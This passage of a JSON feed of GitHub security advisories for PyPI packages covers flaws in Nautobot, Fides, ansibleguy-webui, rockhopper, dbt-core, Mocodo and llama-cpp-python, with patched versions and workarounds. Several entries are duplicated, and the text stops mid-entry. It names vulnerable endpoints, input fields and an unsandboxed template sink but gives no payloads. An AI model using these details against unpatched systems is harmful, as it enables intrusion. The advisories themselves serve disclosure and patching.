{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Python packages hosted at PyPI.org",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/pip.json",
    "description": "Security Advisory for Python packages hosted at PyPI.org on GitHub",
    "items": [
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p><em>What kind of vulnerability is it? Who is impacted?</em></p>\n<p>A user with permissions to view Dynamic Group records (<code>extras.view_dynamicgroup</code> permission) can use the Dynamic Group detail UI view (<code>/extras/dynamic-groups/&lt;uuid&gt;/</code>) and/or the members REST API view (<code>/api/extras/dynamic-groups/&lt;uuid&gt;/members/</code>) to list the objects that are members of a given Dynamic Group. </p>\n<p>In versions of Nautobot between 1.3.0 (where the Dynamic Groups feature was added) and 1.6.22 inclusive, and 2.0.0 through 2.2.4 inclusive, Nautobot fails to restrict these listings based on the member object permissions - for example a Dynamic Group of Device objects will list all Devices that it contains, regardless of the user's <code>dcim.view_device</code> permissions or lack thereof.</p>\n<h3 id=\"patches\">Patches</h3>\n<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>\n<p>Fixed in Nautobot 1.6.23 and 2.2.5.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>\n<p>This vulnerability can be partially mitigated by removing <code>extras.view_dynamicgroup</code> permission from users; a full fix will require upgrading.</p>\n<h3 id=\"references\">References</h3>\n<p><em>Are there any links users can visit to find out more?</em></p>\n<ul>\n<li><a href=\"https://github.com/nautobot/nautobot/pull/5757\">https://github.com/nautobot/nautobot/pull/5757</a></li>\n<li><a href=\"https://github.com/nautobot/nautobot/pull/5762\">https://github.com/nautobot/nautobot/pull/5762</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/nautobot/nautobot/security/advisories/GHSA-qmjf-wc2h-6x3q\">https://github.com/nautobot/nautobot/security/advisories/GHSA-qmjf-wc2h-6x3q</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-36112\">https://nvd.nist.gov/vuln/detail/CVE-2024-36112</a></li>\n<li><a href=\"https://github.com/nautobot/nautobot/pull/5757\">https://github.com/nautobot/nautobot/pull/5757</a></li>\n<li><a href=\"https://github.com/nautobot/nautobot/pull/5762\">https://github.com/nautobot/nautobot/pull/5762</a></li>\n<li><a href=\"https://github.com/nautobot/nautobot/commit/3a63aa1327f943b2ac8452757ea2e4d403387ad6\">https://github.com/nautobot/nautobot/commit/3a63aa1327f943b2ac8452757ea2e4d403387ad6</a></li>\n<li><a href=\"https://github.com/nautobot/nautobot/commit/4d1ff2abe2775b0a6fb16e6d1d503a78226a6f8e\">https://github.com/nautobot/nautobot/commit/4d1ff2abe2775b0a6fb16e6d1d503a78226a6f8e</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qmjf-wc2h-6x3q\">https://github.com/advisories/GHSA-qmjf-wc2h-6x3q</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qmjf-wc2h-6x3q",
            "title": "[nautobot] Nautobot dynamic-group-members doesn't enforce permission restrictions on member objects",
            "date_modified": "2024-05-29T18:40:56.000Z",
            "date_published": "2024-05-29T18:40:56.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qmjf-wc2h-6x3q"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p><em>What kind of vulnerability is it? Who is impacted?</em></p>\n<p>A user with permissions to view Dynamic Group records (<code>extras.view_dynamicgroup</code> permission) can use the Dynamic Group detail UI view (<code>/extras/dynamic-groups/&lt;uuid&gt;/</code>) and/or the members REST API view (<code>/api/extras/dynamic-groups/&lt;uuid&gt;/members/</code>) to list the objects that are members of a given Dynamic Group. </p>\n<p>In versions of Nautobot between 1.3.0 (where the Dynamic Groups feature was added) and 1.6.22 inclusive, and 2.0.0 through 2.2.4 inclusive, Nautobot fails to restrict these listings based on the member object permissions - for example a Dynamic Group of Device objects will list all Devices that it contains, regardless of the user's <code>dcim.view_device</code> permissions or lack thereof.</p>\n<h3 id=\"patches\">Patches</h3>\n<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>\n<p>Fixed in Nautobot 1.6.23 and 2.2.5.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>\n<p>This vulnerability can be partially mitigated by removing <code>extras.view_dynamicgroup</code> permission from users; a full fix will require upgrading.</p>\n<h3 id=\"references\">References</h3>\n<p><em>Are there any links users can visit to find out more?</em></p>\n<ul>\n<li><a href=\"https://github.com/nautobot/nautobot/pull/5757\">https://github.com/nautobot/nautobot/pull/5757</a></li>\n<li><a href=\"https://github.com/nautobot/nautobot/pull/5762\">https://github.com/nautobot/nautobot/pull/5762</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/nautobot/nautobot/security/advisories/GHSA-qmjf-wc2h-6x3q\">https://github.com/nautobot/nautobot/security/advisories/GHSA-qmjf-wc2h-6x3q</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-36112\">https://nvd.nist.gov/vuln/detail/CVE-2024-36112</a></li>\n<li><a href=\"https://github.com/nautobot/nautobot/pull/5757\">https://github.com/nautobot/nautobot/pull/5757</a></li>\n<li><a href=\"https://github.com/nautobot/nautobot/pull/5762\">https://github.com/nautobot/nautobot/pull/5762</a></li>\n<li><a href=\"https://github.com/nautobot/nautobot/commit/3a63aa1327f943b2ac8452757ea2e4d403387ad6\">https://github.com/nautobot/nautobot/commit/3a63aa1327f943b2ac8452757ea2e4d403387ad6</a></li>\n<li><a href=\"https://github.com/nautobot/nautobot/commit/4d1ff2abe2775b0a6fb16e6d1d503a78226a6f8e\">https://github.com/nautobot/nautobot/commit/4d1ff2abe2775b0a6fb16e6d1d503a78226a6f8e</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qmjf-wc2h-6x3q\">https://github.com/advisories/GHSA-qmjf-wc2h-6x3q</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qmjf-wc2h-6x3q",
            "title": "[nautobot] Nautobot dynamic-group-members doesn't enforce permission restrictions on member objects",
            "date_modified": "2024-05-29T18:40:56.000Z",
            "date_published": "2024-05-29T18:40:56.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qmjf-wc2h-6x3q"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The Fides webserver requires a connection to a hosted PostgreSQL database for persistent storage of application data. If the password used by the webserver for this database connection includes special characters such as <code>@</code> and <code>$</code>, webserver startup fails and the part of the password following the special character is exposed in webserver error logs.</p>\n<p>This is caused by improper escaping of the SQLAlchemy password string, see <a href=\"https://docs.sqlalchemy.org/en/14/core/engines.html#escaping-special-characters-such-as-signs-in-passwords\">here</a> and <a href=\"https://github.com/sqlalchemy/sqlalchemy/discussions/6615\">here</a> for more info.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Partial exposure of hosted database password in webserver logs</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The vulnerability has been patched in Fides version <code>2.37.0</code>. Users are advised to upgrade to this version or later to secure their systems against this threat.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>There are no workarounds.</p>\n<h3 id=\"proof-of-concept\">Proof of Concept</h3>\n<ol>\n<li>Create a hosted PostgreSQL database for Fides with a password including <code>@</code> or <code>$</code> e.g. <code>p@ssword</code></li>\n<li>Run Fides and observe failure, sample log attached</li>\n</ol>\n<pre><code>fides  | 2024-02-28 14:27:52.609 | ERROR    | fides.api.db.database:configure_db:117 - Unable to configure database: sqlalchemy.exc.OperationalError: (psycopg2.OperationalError) could not translate host name \"ssword@fides-db\" to address: Name or service not known\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ethyca/fides/security/advisories/GHSA-8cm5-jfj2-26q7\">https://github.com/ethyca/fides/security/advisories/GHSA-8cm5-jfj2-26q7</a></li>\n<li><a href=\"https://github.com/ethyca/fides/commit/6ab37b1ffe2b1a3bd35b706a82f78e061086141c\">https://github.com/ethyca/fides/commit/6ab37b1ffe2b1a3bd35b706a82f78e061086141c</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-34715\">https://nvd.nist.gov/vuln/detail/CVE-2024-34715</a></li>\n<li><a href=\"https://docs.sqlalchemy.org/en/14/core/engines.html#escaping-special-characters-such-as-signs-in-passwords\">https://docs.sqlalchemy.org/en/14/core/engines.html#escaping-special-characters-such-as-signs-in-passwords</a></li>\n<li><a href=\"https://github.com/sqlalchemy/sqlalchemy/discussions/6615\">https://github.com/sqlalchemy/sqlalchemy/discussions/6615</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8cm5-jfj2-26q7\">https://github.com/advisories/GHSA-8cm5-jfj2-26q7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-8cm5-jfj2-26q7",
            "title": "[ethyca-fides] Fides Webserver Logs Hosted Database Password Partial Exposure Vulnerability",
            "date_modified": "2024-05-31T20:44:41.000Z",
            "date_published": "2024-05-29T15:25:51.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-8cm5-jfj2-26q7"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Multiple forms in version &lt;0.0.21 allowed injection of HTML elements.\nThese are returned to the user after executing job actions and thus evaluated by the browser.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>We recommend to upgrade to version &gt;= <a href=\"https://github.com/ansibleguy/webui/releases/tag/0.0.21\">0.0.21</a></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ansibleguy/webui/files/15358522/Report.pdf\">Report</a></li>\n<li><a href=\"https://github.com/ansibleguy/webui/issues/44\">GitHub Issue 44</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ansibleguy/webui/security/advisories/GHSA-927p-xrc2-x2gj\">https://github.com/ansibleguy/webui/security/advisories/GHSA-927p-xrc2-x2gj</a></li>\n<li><a href=\"https://github.com/ansibleguy/webui/commit/7737b47e7f7ddbfec7b1418c724598363718d522\">https://github.com/ansibleguy/webui/commit/7737b47e7f7ddbfec7b1418c724598363718d522</a></li>\n<li><a href=\"https://github.com/ansibleguy/webui/files/15358522/Report.pdf\">https://github.com/ansibleguy/webui/files/15358522/Report.pdf</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-927p-xrc2-x2gj\">https://github.com/advisories/GHSA-927p-xrc2-x2gj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-927p-xrc2-x2gj",
            "title": "[ansibleguy-webui] ansibleguy-webui Cross-site Scripting vulnerability",
            "date_modified": "2024-05-28T21:23:42.000Z",
            "date_published": "2024-05-28T21:23:42.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-927p-xrc2-x2gj"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A vulnerability, which was classified as critical, has been found in bwoodsend rockhopper up to 0.1.2. Affected by this issue is the function <code>count_rows</code> of the file <code>rockhopper/src/ragged_array.c</code> of the component Binary Parser. The manipulation of the argument raw leads to buffer overflow. Local access is required to approach this attack. Upgrading to version 0.2.0 is able to address this issue. The name of the patch is 1a15fad5e06ae693eb9b8908363d2c8ef455104e. It is recommended to upgrade the affected component. The identifier of this vulnerability is VDB-266312.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-4969\">https://nvd.nist.gov/vuln/detail/CVE-2022-4969</a></li>\n<li><a href=\"https://github.com/bwoodsend/rockhopper/commit/1a15fad5e06ae693eb9b8908363d2c8ef455104e\">https://github.com/bwoodsend/rockhopper/commit/1a15fad5e06ae693eb9b8908363d2c8ef455104e</a></li>\n<li><a href=\"https://github.com/bwoodsend/rockhopper/releases/tag/v0.2.0\">https://github.com/bwoodsend/rockhopper/releases/tag/v0.2.0</a></li>\n<li><a href=\"https://vuldb.com/?ctiid.266312\">https://vuldb.com/?ctiid.266312</a></li>\n<li><a href=\"https://vuldb.com/?id.266312\">https://vuldb.com/?id.266312</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4r4c-66gf-g9g5\">https://github.com/advisories/GHSA-4r4c-66gf-g9g5</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4r4c-66gf-g9g5",
            "title": "[rockhopper] rockhopper Buffer Overflow vulnerability",
            "date_modified": "2024-05-28T21:22:46.000Z",
            "date_published": "2024-05-28T21:22:45.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4r4c-66gf-g9g5"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Binding to <code>INADDR_ANY (0.0.0.0)</code> or <code>IN6ADDR_ANY (::)</code> exposes an application on all network interfaces, increasing the risk of unauthorized access.</p>\n<p>While doing some static analysis and code inspection, I found the following code binding a socket to <code>INADDR_ANY</code> by passing <code>\"\"</code> as the address. This effectively binds to any network interface on the local system, not just localhost (127.0.0.1). </p>\n<h3 id=\"details\">Details</h3>\n<p>As stated in the Python docs, a special form for address is accepted instead of a host address: <code>''</code> represents <code>INADDR_ANY</code>, equivalent to <code>\"0.0.0.0\"</code>. On systems with IPv6, '' represents <code>IN6ADDR_ANY</code>, which is equivalent to <code>\"::\"</code>. </p>\n<p><a href=\"https://github.com/dbt-labs/dbt-core/blob/main/core/dbt/task/docs/serve.py#L23C38-L23C39\">https://github.com/dbt-labs/dbt-core/blob/main/core/dbt/task/docs/serve.py#L23C38-L23C39</a></p>\n<p>The text around this code also imply the intention is to host docs only on localhost.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>To recreate, run the docs ServeTask.run() to stand up the HTTP server.  Then run <code>netstat</code> to see what addresses this process is bound.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>A user who serves docs on an unsecured public network, may unknowingly be hosting an unsecured (http) web site for any remote user/system to access on the same network.</p>\n<p>Further references:\n<a href=\"https://docs.python.org/3/library/socket.html#socket-families\">https://docs.python.org/3/library/socket.html#socket-families</a>\n<a href=\"https://docs.securesauce.dev/rules/PY030\">https://docs.securesauce.dev/rules/PY030</a>\n<a href=\"https://cwe.mitre.org/data/definitions/1327.html\">https://cwe.mitre.org/data/definitions/1327.html</a></p>\n<h3 id=\"patches\">Patches</h3>\n<p>The issue has has been mitigated in <a href=\"https://github.com/dbt-labs/dbt-core/releases/tag/v1.6.15\">dbt-core v1.6.15</a>, <a href=\"https://github.com/dbt-labs/dbt-core/releases/tag/v1.7.15\">dbt-core v1.7.15</a>, and <a href=\"https://github.com/dbt-labs/dbt-core/releases/tag/v1.8.1\">dbt-core v1.8.1</a> by binding to localhost explicitly by default in <code>dbt docs serve</code> (<a href=\"https://github.com/dbt-labs/dbt-core/issues/10209\">https://github.com/dbt-labs/dbt-core/issues/10209</a>).</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/dbt-labs/dbt-core/security/advisories/GHSA-pmrx-695r-4349\">https://github.com/dbt-labs/dbt-core/security/advisories/GHSA-pmrx-695r-4349</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-36105\">https://nvd.nist.gov/vuln/detail/CVE-2024-36105</a></li>\n<li><a href=\"https://github.com/dbt-labs/dbt-core/issues/10209\">https://github.com/dbt-labs/dbt-core/issues/10209</a></li>\n<li><a href=\"https://github.com/dbt-labs/dbt-core/pull/10208\">https://github.com/dbt-labs/dbt-core/pull/10208</a></li>\n<li><a href=\"https://github.com/dbt-labs/dbt-core/commit/0c08d7a19ad1740be3cb0b2e6d9d64f6537176f7\">https://github.com/dbt-labs/dbt-core/commit/0c08d7a19ad1740be3cb0b2e6d9d64f6537176f7</a></li>\n<li><a href=\"https://cwe.mitre.org/data/definitions/1327.html\">https://cwe.mitre.org/data/definitions/1327.html</a></li>\n<li><a href=\"https://docs.python.org/3/library/socket.html#socket-families\">https://docs.python.org/3/library/socket.html#socket-families</a></li>\n<li><a href=\"https://docs.securesauce.dev/rules/PY030\">https://docs.securesauce.dev/rules/PY030</a></li>\n<li><a href=\"https://github.com/dbt-labs/dbt-core/blob/main/core/dbt/task/docs/serve.py#L23C38-L23C39\">https://github.com/dbt-labs/dbt-core/blob/main/core/dbt/task/docs/serve.py#L23C38-L23C39</a></li>\n<li><a href=\"https://github.com/dbt-labs/dbt-core/releases/tag/v1.6.15\">https://github.com/dbt-labs/dbt-core/releases/tag/v1.6.15</a></li>\n<li><a href=\"https://github.com/dbt-labs/dbt-core/releases/tag/v1.7.15\">https://github.com/dbt-labs/dbt-core/releases/tag/v1.7.15</a></li>\n<li><a href=\"https://github.com/dbt-labs/dbt-core/releases/tag/v1.8.1\">https://github.com/dbt-labs/dbt-core/releases/tag/v1.8.1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pmrx-695r-4349\">https://github.com/advisories/GHSA-pmrx-695r-4349</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pmrx-695r-4349",
            "title": "[dbt-core] dbt allows Binding to an Unrestricted IP Address via socketsocket",
            "date_modified": "2024-05-28T21:19:15.000Z",
            "date_published": "2024-05-28T21:19:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pmrx-695r-4349"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Binding to <code>INADDR_ANY (0.0.0.0)</code> or <code>IN6ADDR_ANY (::)</code> exposes an application on all network interfaces, increasing the risk of unauthorized access.</p>\n<p>While doing some static analysis and code inspection, I found the following code binding a socket to <code>INADDR_ANY</code> by passing <code>\"\"</code> as the address. This effectively binds to any network interface on the local system, not just localhost (127.0.0.1). </p>\n<h3 id=\"details\">Details</h3>\n<p>As stated in the Python docs, a special form for address is accepted instead of a host address: <code>''</code> represents <code>INADDR_ANY</code>, equivalent to <code>\"0.0.0.0\"</code>. On systems with IPv6, '' represents <code>IN6ADDR_ANY</code>, which is equivalent to <code>\"::\"</code>. </p>\n<p><a href=\"https://github.com/dbt-labs/dbt-core/blob/main/core/dbt/task/docs/serve.py#L23C38-L23C39\">https://github.com/dbt-labs/dbt-core/blob/main/core/dbt/task/docs/serve.py#L23C38-L23C39</a></p>\n<p>The text around this code also imply the intention is to host docs only on localhost.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>To recreate, run the docs ServeTask.run() to stand up the HTTP server.  Then run <code>netstat</code> to see what addresses this process is bound.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>A user who serves docs on an unsecured public network, may unknowingly be hosting an unsecured (http) web site for any remote user/system to access on the same network.</p>\n<p>Further references:\n<a href=\"https://docs.python.org/3/library/socket.html#socket-families\">https://docs.python.org/3/library/socket.html#socket-families</a>\n<a href=\"https://docs.securesauce.dev/rules/PY030\">https://docs.securesauce.dev/rules/PY030</a>\n<a href=\"https://cwe.mitre.org/data/definitions/1327.html\">https://cwe.mitre.org/data/definitions/1327.html</a></p>\n<h3 id=\"patches\">Patches</h3>\n<p>The issue has has been mitigated in <a href=\"https://github.com/dbt-labs/dbt-core/releases/tag/v1.6.15\">dbt-core v1.6.15</a>, <a href=\"https://github.com/dbt-labs/dbt-core/releases/tag/v1.7.15\">dbt-core v1.7.15</a>, and <a href=\"https://github.com/dbt-labs/dbt-core/releases/tag/v1.8.1\">dbt-core v1.8.1</a> by binding to localhost explicitly by default in <code>dbt docs serve</code> (<a href=\"https://github.com/dbt-labs/dbt-core/issues/10209\">https://github.com/dbt-labs/dbt-core/issues/10209</a>).</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/dbt-labs/dbt-core/security/advisories/GHSA-pmrx-695r-4349\">https://github.com/dbt-labs/dbt-core/security/advisories/GHSA-pmrx-695r-4349</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-36105\">https://nvd.nist.gov/vuln/detail/CVE-2024-36105</a></li>\n<li><a href=\"https://github.com/dbt-labs/dbt-core/issues/10209\">https://github.com/dbt-labs/dbt-core/issues/10209</a></li>\n<li><a href=\"https://github.com/dbt-labs/dbt-core/pull/10208\">https://github.com/dbt-labs/dbt-core/pull/10208</a></li>\n<li><a href=\"https://github.com/dbt-labs/dbt-core/commit/0c08d7a19ad1740be3cb0b2e6d9d64f6537176f7\">https://github.com/dbt-labs/dbt-core/commit/0c08d7a19ad1740be3cb0b2e6d9d64f6537176f7</a></li>\n<li><a href=\"https://cwe.mitre.org/data/definitions/1327.html\">https://cwe.mitre.org/data/definitions/1327.html</a></li>\n<li><a href=\"https://docs.python.org/3/library/socket.html#socket-families\">https://docs.python.org/3/library/socket.html#socket-families</a></li>\n<li><a href=\"https://docs.securesauce.dev/rules/PY030\">https://docs.securesauce.dev/rules/PY030</a></li>\n<li><a href=\"https://github.com/dbt-labs/dbt-core/blob/main/core/dbt/task/docs/serve.py#L23C38-L23C39\">https://github.com/dbt-labs/dbt-core/blob/main/core/dbt/task/docs/serve.py#L23C38-L23C39</a></li>\n<li><a href=\"https://github.com/dbt-labs/dbt-core/releases/tag/v1.6.15\">https://github.com/dbt-labs/dbt-core/releases/tag/v1.6.15</a></li>\n<li><a href=\"https://github.com/dbt-labs/dbt-core/releases/tag/v1.7.15\">https://github.com/dbt-labs/dbt-core/releases/tag/v1.7.15</a></li>\n<li><a href=\"https://github.com/dbt-labs/dbt-core/releases/tag/v1.8.1\">https://github.com/dbt-labs/dbt-core/releases/tag/v1.8.1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pmrx-695r-4349\">https://github.com/advisories/GHSA-pmrx-695r-4349</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pmrx-695r-4349",
            "title": "[dbt-core] dbt allows Binding to an Unrestricted IP Address via socketsocket",
            "date_modified": "2024-05-28T21:19:15.000Z",
            "date_published": "2024-05-28T21:19:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pmrx-695r-4349"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Binding to <code>INADDR_ANY (0.0.0.0)</code> or <code>IN6ADDR_ANY (::)</code> exposes an application on all network interfaces, increasing the risk of unauthorized access.</p>\n<p>While doing some static analysis and code inspection, I found the following code binding a socket to <code>INADDR_ANY</code> by passing <code>\"\"</code> as the address. This effectively binds to any network interface on the local system, not just localhost (127.0.0.1). </p>\n<h3 id=\"details\">Details</h3>\n<p>As stated in the Python docs, a special form for address is accepted instead of a host address: <code>''</code> represents <code>INADDR_ANY</code>, equivalent to <code>\"0.0.0.0\"</code>. On systems with IPv6, '' represents <code>IN6ADDR_ANY</code>, which is equivalent to <code>\"::\"</code>. </p>\n<p><a href=\"https://github.com/dbt-labs/dbt-core/blob/main/core/dbt/task/docs/serve.py#L23C38-L23C39\">https://github.com/dbt-labs/dbt-core/blob/main/core/dbt/task/docs/serve.py#L23C38-L23C39</a></p>\n<p>The text around this code also imply the intention is to host docs only on localhost.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>To recreate, run the docs ServeTask.run() to stand up the HTTP server.  Then run <code>netstat</code> to see what addresses this process is bound.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>A user who serves docs on an unsecured public network, may unknowingly be hosting an unsecured (http) web site for any remote user/system to access on the same network.</p>\n<p>Further references:\n<a href=\"https://docs.python.org/3/library/socket.html#socket-families\">https://docs.python.org/3/library/socket.html#socket-families</a>\n<a href=\"https://docs.securesauce.dev/rules/PY030\">https://docs.securesauce.dev/rules/PY030</a>\n<a href=\"https://cwe.mitre.org/data/definitions/1327.html\">https://cwe.mitre.org/data/definitions/1327.html</a></p>\n<h3 id=\"patches\">Patches</h3>\n<p>The issue has has been mitigated in <a href=\"https://github.com/dbt-labs/dbt-core/releases/tag/v1.6.15\">dbt-core v1.6.15</a>, <a href=\"https://github.com/dbt-labs/dbt-core/releases/tag/v1.7.15\">dbt-core v1.7.15</a>, and <a href=\"https://github.com/dbt-labs/dbt-core/releases/tag/v1.8.1\">dbt-core v1.8.1</a> by binding to localhost explicitly by default in <code>dbt docs serve</code> (<a href=\"https://github.com/dbt-labs/dbt-core/issues/10209\">https://github.com/dbt-labs/dbt-core/issues/10209</a>).</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/dbt-labs/dbt-core/security/advisories/GHSA-pmrx-695r-4349\">https://github.com/dbt-labs/dbt-core/security/advisories/GHSA-pmrx-695r-4349</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-36105\">https://nvd.nist.gov/vuln/detail/CVE-2024-36105</a></li>\n<li><a href=\"https://github.com/dbt-labs/dbt-core/issues/10209\">https://github.com/dbt-labs/dbt-core/issues/10209</a></li>\n<li><a href=\"https://github.com/dbt-labs/dbt-core/pull/10208\">https://github.com/dbt-labs/dbt-core/pull/10208</a></li>\n<li><a href=\"https://github.com/dbt-labs/dbt-core/commit/0c08d7a19ad1740be3cb0b2e6d9d64f6537176f7\">https://github.com/dbt-labs/dbt-core/commit/0c08d7a19ad1740be3cb0b2e6d9d64f6537176f7</a></li>\n<li><a href=\"https://cwe.mitre.org/data/definitions/1327.html\">https://cwe.mitre.org/data/definitions/1327.html</a></li>\n<li><a href=\"https://docs.python.org/3/library/socket.html#socket-families\">https://docs.python.org/3/library/socket.html#socket-families</a></li>\n<li><a href=\"https://docs.securesauce.dev/rules/PY030\">https://docs.securesauce.dev/rules/PY030</a></li>\n<li><a href=\"https://github.com/dbt-labs/dbt-core/blob/main/core/dbt/task/docs/serve.py#L23C38-L23C39\">https://github.com/dbt-labs/dbt-core/blob/main/core/dbt/task/docs/serve.py#L23C38-L23C39</a></li>\n<li><a href=\"https://github.com/dbt-labs/dbt-core/releases/tag/v1.6.15\">https://github.com/dbt-labs/dbt-core/releases/tag/v1.6.15</a></li>\n<li><a href=\"https://github.com/dbt-labs/dbt-core/releases/tag/v1.7.15\">https://github.com/dbt-labs/dbt-core/releases/tag/v1.7.15</a></li>\n<li><a href=\"https://github.com/dbt-labs/dbt-core/releases/tag/v1.8.1\">https://github.com/dbt-labs/dbt-core/releases/tag/v1.8.1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pmrx-695r-4349\">https://github.com/advisories/GHSA-pmrx-695r-4349</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pmrx-695r-4349",
            "title": "[dbt-core] dbt allows Binding to an Unrestricted IP Address via socketsocket",
            "date_modified": "2024-05-28T21:19:15.000Z",
            "date_published": "2024-05-28T21:19:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pmrx-695r-4349"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Mocodo Mocodo Online 4.2.6 and below does not properly sanitize the <code>sql_case</code> input field in <code>/web/generate.php</code>, allowing remote attackers to execute arbitrary SQL commands and potentially command injection, leading to remote code execution (RCE) under certain conditions.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-35374\">https://nvd.nist.gov/vuln/detail/CVE-2024-35374</a></li>\n<li><a href=\"https://github.com/laowantong/mocodo/commit/f9368df28518b6c4a92fd207c260f1978ec34d6e\">https://github.com/laowantong/mocodo/commit/f9368df28518b6c4a92fd207c260f1978ec34d6e</a></li>\n<li><a href=\"https://chocapikk.com/posts/2024/mocodo-vulnerabilities\">https://chocapikk.com/posts/2024/mocodo-vulnerabilities</a></li>\n<li><a href=\"https://github.com/laowantong/mocodo/blob/11ca879060a68e06844058cd969c6379214cc2a8/web/generate.php#L104-L158\">https://github.com/laowantong/mocodo/blob/11ca879060a68e06844058cd969c6379214cc2a8/web/generate.php#L104-L158</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-j6cv-98jx-mrwr\">https://github.com/advisories/GHSA-j6cv-98jx-mrwr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-j6cv-98jx-mrwr",
            "title": "[mocodo] Mocodo vulnerable to SQL injection in `/web/generate.php`",
            "date_modified": "2024-05-28T20:20:38.000Z",
            "date_published": "2024-05-28T20:20:37.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-j6cv-98jx-mrwr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"description\">Description</h2>\n<p><code>llama-cpp-python</code> depends on class <code>Llama</code> in <code>llama.py</code> to load <code>.gguf</code> llama.cpp or Latency Machine Learning Models. The <code>__init__</code> constructor built in the <code>Llama</code> takes several parameters to configure the loading and running of the model. Other than <code>NUMA, LoRa settings</code>, <code>loading tokenizers,</code> and <code>hardware settings</code>, <code>__init__</code> also loads the <code>chat template</code> from targeted <code>.gguf</code> 's Metadata and furtherly parses it to <code>llama_chat_format.Jinja2ChatFormatter.to_chat_handler()</code> to construct the <code>self.chat_handler</code> for this model. Nevertheless, <code>Jinja2ChatFormatter</code> parse the <code>chat template</code> within the Metadate with sandbox-less <code>jinja2.Environment</code>, which is furthermore rendered in <code>__call__</code> to construct the <code>prompt</code> of interaction. This allows <code>jinja2</code> Server Side Template Injection which leads to RCE by a carefully constructed payload.</p>\n<h2 id=\"source-to-sink\">Source-to-Sink</h2>\n<h3 